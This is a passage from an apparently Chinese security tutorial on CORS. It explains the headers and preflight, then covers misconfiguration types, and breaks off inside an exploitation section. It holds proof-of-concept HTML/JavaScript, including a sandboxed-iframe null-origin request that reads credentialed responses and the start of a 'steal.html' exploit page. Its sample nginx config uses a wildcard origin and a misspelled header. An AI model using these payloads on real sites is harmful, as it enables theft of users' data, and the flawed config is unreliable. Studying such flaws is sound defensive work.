true​​​，即表示服务器明确许可，Cookie 可以包含在请求中，一起发给服务器。这个值也只能设为 true​​​，如果服务器不要浏览器发送 Cookie，删除该字段即可。</p><p>（3）Access-Control-Expose-Headers</p><p>该字段可选。CORS 请求时，XMLHttpRequest​​ ​对象的 <code>getResponseHeader()</code>​​ ​方法只能拿到 6 个基本字段：Cache-Control​​​、Content-Language​​​、Content-Type​​​、Expires​​​、Last-Modified​​​、Pragma​​​。如果想拿到其他字段，就必须在 Access-Control-Expose-Headers​​ ​里面指定。上面的例子指定，getResponseHeader(&#39;FooBar&#39;)​​ ​可以返回 FooBar​​ ​字段的值。</p><p>（4）Access-Control-Allow-Methods​</p><p>该字段表示允许请求的方法，比如 GET, POST, PUT, DELETE 等</p><p>​add_header &#39;Access-Control-Allow-Methods&#39; <code>*</code>;​​ // 表示允许任意方法</p><p><strong>服务端的 Nginx 配置</strong></p><p>请确保将配置行添加到 http​​ 配置块的大括号 ({}​​) 内并保存重启 Nginx。</p><div class="language-nginx line-numbers-mode" data-ext="nginx" data-title="nginx"><pre class="language-nginx"><code><span class="token directive"><span class="token keyword">http</span></span> <span class="token punctuation">{</span>\n    <span class="token directive"><span class="token keyword">include</span>       mime.types</span><span class="token punctuation">;</span>\n    <span class="token directive"><span class="token keyword">default_type</span>  application/octet-stream</span><span class="token punctuation">;</span>\n\n    <span class="token comment"># 其他配置...</span>\n\n    <span class="token comment"># 添加下面这行配置，允许跨域请求的网站</span>\n    <span class="token comment">#add_header &#39;Access-Control-Allow-Origin&#39; &#39;http://xxx.xxx.xxx&#39;;</span>\n    <span class="token directive"><span class="token keyword">add_header</span> <span class="token string">&#39;Access-Control-Allow-Origin&#39;</span> <span class="token string">&#39;*&#39;</span></span><span class="token punctuation">;</span>\n    <span class="token comment">#add_header &#39;Access-Control-Allow-Credential&#39; &#39;true&#39;;</span>\n    <span class="token directive"><span class="token keyword">add_header</span> <span class="token string">&#39;Access_control-Allow-Method&#39;</span> <span class="token string">&#39;*&#39;</span></span><span class="token punctuation">;</span>\n\n    <span class="token comment"># 其他配置...</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="withcredentials-属性" tabindex="-1"><a class="header-anchor" href="#withcredentials-属性"><span>withCredentials 属性</span></a></h3><p>上面说到，CORS 请求默认不发送 Cookie 和 HTTP 认证信息。如果要把 Cookie 发到服务器，一方面要服务器同意，指定 <code>Access-Control-Allow-Credentials</code>​ ​字段。</p><div class="language-http line-numbers-mode" data-ext="http" data-title="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">Access-Control-Allow-Credentials</span><span class="token punctuation">:</span> <span class="token header-value">true</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>另一方面，开发者必须在 AJAX​​ 请求中打开 withCredentials​​ ​属性。</p><div class="language-javascript line-numbers-mode" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nxhr<span class="token punctuation">.</span>withCredentials <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>否则，即使服务器同意发送 Cookie，浏览器也不会发送。或者，服务器要求设置 Cookie，浏览器也不会处理。</p><p>但是，如果省略 withCredentials​ ​设置，有的浏览器还是会一起发送 Cookie。这时，可以显式关闭 withCredentials​​。</p><div class="language-javascript line-numbers-mode" data-ext="js" data-title="js"><pre class="language-javascript"><code>xhr<span class="token punctuation">.</span>withCredentials <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>需要注意的是，如果要发送 Cookie，Access-Control-Allow-Origin​​ ​就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie 依然遵循同源政策，只有用服务器域名设置的 Cookie 才会上传，其他域名的 Cookie 并不会上传，且（跨源）原网页代码中的 document.cookie​​ ​也无法读取服务器域名下的 Cookie。</p><h2 id="非简单请求" tabindex="-1"><a class="header-anchor" href="#非简单请求"><span>非简单请求</span></a></h2><p>非简单请求是那种对服务器有特殊要求的请求，比如请求方法是 PUT​​ 或 DELETE​​，或者 Content-Type​​ 字段的类型是 <code>application/json</code>​​。</p><p>非简单请求的 CORS 请求，会在正式通信之前，增加一次 HTTP 查询请求，称为<code>&quot;预检&quot;请求（preflight​​）</code>。</p><h3 id="预检请求" tabindex="-1"><a class="header-anchor" href="#预检请求"><span>预检请求</span></a></h3><p>浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些 HTTP 动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的 XMLHttpRequest​ ​请求，否则就报错。</p><p>下面是一段浏览器的 JavaScript 脚本，在浏览器 consolo​​ 执行。</p><div class="language-javascript line-numbers-mode" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token string">&#39;http://api.alice.com/cors&#39;</span><span class="token punctuation">;</span>\n<span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nxhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&#39;PUT&#39;</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nxhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">&#39;X-Custom-Header&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;value&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nxhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上面代码中，HTTP 请求的方法是 PUT​​，并且发送一个自定义头信息 X-Custom-Header​​。</p><p>浏览器发现，这是一个非简单请求，就自动发出一个&quot;预检&quot;请求，要求服务器确认可以这样请求。下面是这个&quot;预检&quot;请求的 HTTP 头信息。</p><div class="language-http line-numbers-mode" data-ext="http" data-title="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">OPTIONS</span> <span class="token request-target url">/cors</span> <span class="token http-version property">HTTP/1.1</span></span>\n<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://api.bob.com</span></span>\n<span class="token header"><span class="token header-name keyword">Access-Control-Request-Method</span><span class="token punctuation">:</span> <span class="token header-value">PUT</span></span>\n<span class="token header"><span class="token header-name keyword">Access-Control-Request-Headers</span><span class="token punctuation">:</span> <span class="token header-value">X-Custom-Header</span></span>\n<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">api.alice.com</span></span>\n<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US</span></span>\n<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">keep-alive</span></span>\n<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0...</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>&quot;预检&quot;请求用的请求方法是 <code>OPTIONS</code>​​​，表示这个请求是用来询问的。头信息里面，关键字段是 Origin​​​，表示请求来自哪个源。</p><p>除了 Origin​ ​字段，&quot;预检&quot;请求的头信息包括两个特殊字段。</p><p>（1）Access-Control-Request-Method</p><p>该字段是必须的，用来列出浏览器的 CORS 请求会用到哪些 HTTP 方法，上例是 PUT​​。</p><p>（2）Access-Control-Request-Headers</p><p>该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段，上例是 X-Custom-Header​​​​。</p>',50),pn={href:"https://blog.huli.tw/2017/08/27/ajax-and-cors/#cors:~:text=%E5%81%87%E8%A8%AD%E4%BB%8A%E5%A4%A9%E6%9F%90%E5%80%8B,Request%20%E7%9A%84%E7%9B%AE%E7%9A%84%E3%80%82",target:"_blank",rel:"noopener noreferrer"},on=(0,e.Fv)('<blockquote><p>假設今天某個 Server 提供了一個 API 網址叫做：<a href="">https://example.com/data/16</a>​​，你只要對它發送 GET，就能夠拿到 id 是 16 的資料，只要對它發送 DELETE，就可以把這筆資料刪除。</p><p>如果今天沒有 Preflight Request 這個機制的話，我就可以在隨便一個 Domain 的網頁上面發送一個 DELETE 的 Request 給這個 API。剛剛我有強調說瀏覽器的 CORS 機制，還是會幫你發送 Request，但只是 Response 被瀏覽器擋住而已。</p><p>因此呢，儘管沒有 Response，但是 Server 端的確收到了這個 Request，因此就會把這筆資料給刪除。</p><p>如果有 Preflight Request 的話，在發送出去收到結果的時候，就會知道這個 API 並沒有提供 CORS，因此真的 DELETE 請求就不會送出，到這邊就結束了。</p><p><strong>先用一個 OPTIONS 的請求去確認之後的 Request 能不能送出，這就是 Preflight Request 的目的。</strong></p></blockquote><h3 id="预检请求的回应" tabindex="-1"><a class="header-anchor" href="#预检请求的回应"><span>预检请求的回应</span></a></h3><p>服务器收到&quot;预检&quot;请求以后，检查了 Origin​​、Access-Control-Request-Method​ ​和 Access-Control-Request-Headers​ ​字段以后，确认允许跨源请求，就可以做出回应。</p><div class="language-http line-numbers-mode" data-ext="http" data-title="http"><pre class="language-http"><code><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>\n<span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Mon, 01 Dec 2008 01:15:39 GMT</span></span>\n<span class="token header"><span class="token header-name keyword">Server</span><span class="token punctuation">:</span> <span class="token header-value">Apache/2.0.61 (Unix)</span></span>\n<span class="token header"><span class="token header-name keyword">Access-Control-Allow-Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://api.bob.com</span></span>\n<span class="token header"><span class="token header-name keyword">Access-Control-Allow-Methods</span><span class="token punctuation">:</span> <span class="token header-value">GET, POST, PUT</span></span>\n<span class="token header"><span class="token header-name keyword">Access-Control-Allow-Headers</span><span class="token punctuation">:</span> <span class="token header-value">X-Custom-Header</span></span>\n<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html; charset=utf-8</span></span>\n<span class="token header"><span class="token header-name keyword">Content-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip</span></span>\n<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">0</span></span>\n<span class="token header"><span class="token header-name keyword">Keep-Alive</span><span class="token punctuation">:</span> <span class="token header-value">timeout=2, max=100</span></span>\n<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">Keep-Alive</span></span>\n<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/plain</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上面的 HTTP 回应中，关键的是 Access-Control-Allow-Origin​​ ​字段，表示 http://api.bob.com​​ ​可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。</p><div class="language-http line-numbers-mode" data-ext="http" data-title="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">Access-Control-Allow-Origin</span><span class="token punctuation">:</span> <span class="token header-value">*</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>如果服务器否定了&quot;预检&quot;请求，会返回一个正常的 HTTP 回应，但是没有任何 CORS 相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被 XMLHttpRequest​​ ​对象的 onerror​​ ​回调函数捕获。控制台会打印出如下的报错信息。</p><div class="language-http line-numbers-mode" data-ext="http" data-title="http"><pre class="language-http"><code>XMLHttpRequest cannot load http://api.alice.com.\nOrigin http://api.bob.com is not allowed by Access-Control-Allow-Origin.\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>服务器回应的其他 CORS 相关字段如下。</p><div class="language-http line-numbers-mode" data-ext="http" data-title="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">Access-Control-Allow-Methods</span><span class="token punctuation">:</span> <span class="token header-value">GET, POST, PUT</span></span>\n<span class="token header"><span class="token header-name keyword">Access-Control-Allow-Headers</span><span class="token punctuation">:</span> <span class="token header-value">X-Custom-Header</span></span>\n<span class="token header"><span class="token header-name keyword">Access-Control-Allow-Credentials</span><span class="token punctuation">:</span> <span class="token header-value">true</span></span>\n<span class="token header"><span class="token header-name keyword">Access-Control-Max-Age</span><span class="token punctuation">:</span> <span class="token header-value">1728000</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>（1）Access-Control-Allow-Methods</p><p>该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次&quot;预检&quot;请求。</p><p>（2）Access-Control-Allow-Headers</p><p>如果浏览器请求包括 Access-Control-Request-Headers​ ​字段，则 Access-Control-Allow-Headers​ ​字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在&quot;预检&quot;中请求的字段。</p><p>（3）Access-Control-Allow-Credentials</p><p>该字段与简单请求时的含义相同。</p><p>（4）Access-Control-Max-Age</p><p>该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是 20 天（1728000 秒），即允许缓存该条回应 1728000 秒（即 20 天），在此期间，不用发出另一条预检请求。</p><h3 id="浏览器的正常请求和回应" tabindex="-1"><a class="header-anchor" href="#浏览器的正常请求和回应"><span>浏览器的正常请求和回应</span></a></h3><p>一旦服务器通过了&quot;预检&quot;请求，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样，会有一个 Origin​​ ​头信息字段。服务器的回应，也都会有一个 Access-Control-Allow-Origin​​ ​头信息字段。</p><p>下面是&quot;预检&quot;请求之后，浏览器的正常 CORS 请求。</p><div class="language-http line-numbers-mode" data-ext="http" data-title="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">PUT</span> <span class="token request-target url">/cors</span> <span class="token http-version property">HTTP/1.1</span></span>\n<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://api.bob.com</span></span>\n<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">api.alice.com</span></span>\n<span class="token header"><span class="token header-name keyword">X-Custom-Header</span><span class="token punctuation">:</span> <span class="token header-value">value</span></span>\n<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US</span></span>\n<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">keep-alive</span></span>\n<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0...</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上面头信息的 Origin​ ​字段是浏览器自动添加的。</p><p>下面是服务器正常的回应。</p><div class="language-http line-numbers-mode" data-ext="http" data-title="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">Access-Control-Allow-Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://api.bob.com</span></span>\n<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html; charset=utf-8</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>上面头信息中，Access-Control-Allow-Origin​ ​字段是每次回应都必定包含的。</p><h1 id="_0x04-cors-错误配置类型" tabindex="-1"><a class="header-anchor" href="#_0x04-cors-错误配置类型"><span>0x04 CORS 错误配置类型</span></a></h1><h2 id="反射-origin-头" tabindex="-1"><a class="header-anchor" href="#反射-origin-头"><span>反射 Origin 头</span></a></h2><p>如下配置：</p><div class="language-http line-numbers-mode" data-ext="http" data-title="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">Access-Control-Allow-Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://a.com, http://c.com</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>或者</p><div class="language-http line-numbers-mode" data-ext="http" data-title="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">Access-Control-Allow-Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://*.a.com</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这两种域名事实上配置是错误的，因为 CORS 标准规定，Access-Control-Allow-Origin​​ 只能配置为单个 origin, null​​ 或 <code>*</code>​​。如果开发者想要实现同时与多个域名共享域名的需求，则需要专门编写代码或者使用框架来协助动态生成访问控制策略。</p><p>最简单地动态生成访问控制策略的方法，就是在 Access-Control-Allow-Origin 中反射请求的 Origin 值。例如，下面是一个错误 Nginx 配置示例：</p><div class="language-nginx line-numbers-mode" data-ext="nginx" data-title="nginx"><pre class="language-nginx"><code><span class="token directive"><span class="token keyword">add_header</span> <span class="token string">&quot;Access-Control-Allow-Origin&quot;</span> <span class="token variable">$http_origin</span></span><span class="token punctuation">;</span> // 单纯的\n<span class="token directive"><span class="token keyword">add_header</span> <span class="token string">&quot;Access-Control-Allow-Credentials&quot;</span> <span class="token string">&quot;true&quot;</span></span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>这种配置非常危险，相当于信任任意网站，给攻击者网站敞开了大门。任意攻击者网站可以直接跨域读取其资源内容。</p><h2 id="origin-校验错误" tabindex="-1"><a class="header-anchor" href="#origin-校验错误"><span>Origin 校验错误</span></a></h2><ul><li><strong>前缀匹配</strong>: 资源服务器在检查请求中 Origin 值时，只匹配了前缀。例如 www.example.com 想要允许 example.com 访问，但是只做了前缀匹配，导致同时信任了 example.com.attack.com 的访问，而 example.com.attack.com 是攻击者可以控制的网站。</li><li><strong>后缀匹配</strong>：资源服务器在检查请求中 Origin 值时，只做了后缀匹配。例如 www.example.com 想要允许 example.com 访问，由于后缀匹配出错，导致允许 attackexample.com 访问。</li><li><strong>没有转义</strong> <code>.</code>​​：例如，example.com 想要允许 www.example.com 访问时，但正则匹配没有转义 .​​，导致允许 wwwaexample.com 访问。</li><li><strong>包含匹配</strong>：我们还发现有的网站 www.example.com 想要允许 example.com，但是 Origin 校验出错，出现允许 ample.com 访问。</li></ul><h2 id="信任-null" tabindex="-1"><a class="header-anchor" href="#信任-null"><span>信任 null</span></a></h2><p>RFC 6564 规定，如果请求来自隐私敏感上下文时，Origin 头的值应该为 null，但是它却没有明确界定什么是隐私敏感上下文。</p><p>CORS 协议复用了 Origin 头，有些开发者在网站上配置信任 null，<strong>用于与本地 file 页面共享数据</strong>，如下所示：</p><div class="language-http line-numbers-mode" data-ext="http" data-title="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">Access-Control-Allow-Origin</span><span class="token punctuation">:</span> <span class="token header-value">null</span></span>\n<span class="token header"><span class="token header-name keyword">Access-Control-Allow-Credentials</span><span class="token punctuation">:</span> <span class="token header-value">true</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>但是事实上，除了本地 file 页面的跨域请求 Origin 头为 null 外，攻击者还可以从任意域下<strong>通过 iframe sandbox 构造 Origin 为 null 的跨域请求</strong>，如下是一段示意代码：</p><div class="language-html line-numbers-mode" data-ext="html" data-title="html"><pre class="language-html"><code>&lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot; src=&#39;data:text/html,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">XMLHttpRequest here</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>’&gt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这就意味着任何配置有 Access-Control-Allow-Origin: null​​ ​和 Access-Control-Allow-Credentials:true​​ ​的网站等同于没有浏览器 SOP 的保护，都可以被其他任意域以这种方式读取内容。</p><p><strong>e.g.</strong></p><div class="language-html line-numbers-mode" data-ext="html" data-title="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">sandbox</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>allow-scripts allow-top-navigation allow-forms<span class="token punctuation">&quot;</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&#39;</span>data:text/html,&lt;script&gt;\nvar xhr=new XMLHttpRequest();\nxhr.onreadystatechange = function() {\nif (xhr.readyState == XMLHttpRequest.DONE) {\n        alert(xhr.responseText);\n    }\n}\nxhr.open(&quot;GET&quot;, &quot;http://www.vuln.com:8081/cors/corsvuln.jsp&quot;, true);\nxhr.withCredentials = true;\nxhr.send();&lt;/script&gt;<span class="token punctuation">&#39;</span></span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="https-域信任-http-域" tabindex="-1"><a class="header-anchor" href="#https-域信任-http-域"><span>HTTPS 域信任 HTTP 域</span></a></h2><p>中间人攻击者可以先劫持受信任 HTTP 域，然后通过这个域发送跨域请求到 HTTPS 网站，间接读取 HTTPS 域下的受保护内容。</p><figure><img src="'+i+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="信任自身全部子域" tabindex="-1"><a class="header-anchor" href="#信任自身全部子域"><span>信任自身全部子域</span></a></h2><p>很多网站为了方便会将 CORS 配置为信任全部自身子域，这种配置会导致子域 XSS 的危害被强化。为了防止某个子域上 XSS 漏洞的危害其他子域，浏览器设计了 Cookie 的 httponly 标志，用于限制 Javascript 读取 Cookie，因此某个子域 XSS 不能读取带有 httponly 标记的 Cookie，难以窃取其他重要子域上的敏感内容。 但是如果这个域配置了 CORS 且信任全部子域，那么攻击者可以利用其他任意子域上 XSS 漏洞，发送跨域请求到目标重要域网站，从而获取敏感内容。</p><h2 id="​origin-​​​-与-credentials-true​​​-共用" tabindex="-1"><a class="header-anchor" href="#​origin-​​​-与-credentials-true​​​-共用"><span>​<code>Origin:*​​​</code> 与 <code>Credentials:true</code>​​​ 共用</span></a></h2><p>CORS 规定，<code>Access-Control-Allow-Origin:*</code>​​ 与 <code>Access-Control-Allow-Credentials:true</code>​​ 不能同时使用。浏览器会对下面这种误配置报错：</p><div class="language-http line-numbers-mode" data-ext="http" data-title="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">Access-Control-Allow-Origin</span><span class="token punctuation">:</span> <span class="token header-value">* </span></span>\n<span class="token header"><span class="token header-name keyword">Access-Control-Allow-Credentials</span><span class="token punctuation">:</span> <span class="token header-value">true </span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>这就意味着，<code>Access-Control-Allow-Origin:*</code>​​ 只能用于共享公开资源。</p><h2 id="缺少-vary-origin​​​-头" tabindex="-1"><a class="header-anchor" href="#缺少-vary-origin​​​-头"><span>缺少 <code>Vary:Origin</code>​​​ 头</span></a></h2><p>当资源服务器需要共享多个域名时，它需要每个不同请求域的跨域请求生成不同的访问控制策略。但一旦这个资源内容需要被缓存，则会带来 CORS 失效问题。例如，c.com 同时允许 a.com 和 b.com 共享。c.com 资源内容首先被 a.com 脚本跨域访问后被缓存，其中缓存响应头为 Access-Control-Allow-Origin: http://a.com​​”。这时，b.com 脚本则不能读取缓存响应内容，因为缓存响应头是允许 a.com 共享，而不是 b.com。HTTP 协议提供了 Vary 头，用于解决这种情况，资源服务器需要在响应头中配置 <code>Vary:Origin</code>​​ <strong>头来指导缓存，为每个不同的 Origin 头缓存一份不同的内容</strong>。</p><h1 id="_0x05-挖掘利用" tabindex="-1"><a class="header-anchor" href="#_0x05-挖掘利用"><span>0x05 挖掘利用</span></a></h1><p>CORS 的漏洞主要看当我们发起的请求中带有 Origin 头部字段时，服务器的返回包带有 CORS 的相关字段并且允许 Origin 的域访问。</p><p><strong>变换请求头的 origin 字段，如果返回包中的 Access-Control-Allow-Origin​​ 内容和发送的 origin 头内容相同，则存在此问题。</strong></p><p><strong>利用</strong></p><ul><li>前提：含有 CORS 配置的网站</li><li>利用 html 标签和表单发送请求</li><li>访问内网敏感资源</li><li>绕过返会话劫持</li></ul><p><strong>一般形式跨域请求利用</strong></p><p>在攻击者自己控制的网页上嵌入跨域请求，用户访问链接，执行了跨域请求，从而攻击目标。</p><h2 id="方法一-检测工具" tabindex="-1"><a class="header-anchor" href="#方法一-检测工具"><span>方法一：检测工具</span></a></h2>',66),ln={href:"https://github.com/chenjj/CORScanner",target:"_blank",rel:"noopener noreferrer"},cn=(0,e.Fv)('<h3 id="exp-poc" tabindex="-1"><a class="header-anchor" href="#exp-poc"><span>EXP &amp; POC</span></a></h3><div class="language-html line-numbers-mode" data-ext="html" data-title="html"><pre class="language-html"><code><span class="token comment">&lt;!-- mob.exp/steal.html  --&gt;</span>\n<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>en<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>Hello,this is evil page. <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>CORS POC Exploit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>\n\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>demo<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>button<span class="token punctuation">&quot;</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token value javascript language-javascript"><span class="token function">corsExploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">&quot;</span></span></span><span class="token punctuation">&gt;</span></span>Exploit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>\n\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/javascript<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">\n    <span class="token keyword">function</span> <span class="token function">corsExploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n        <span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n        xhr<span class="token 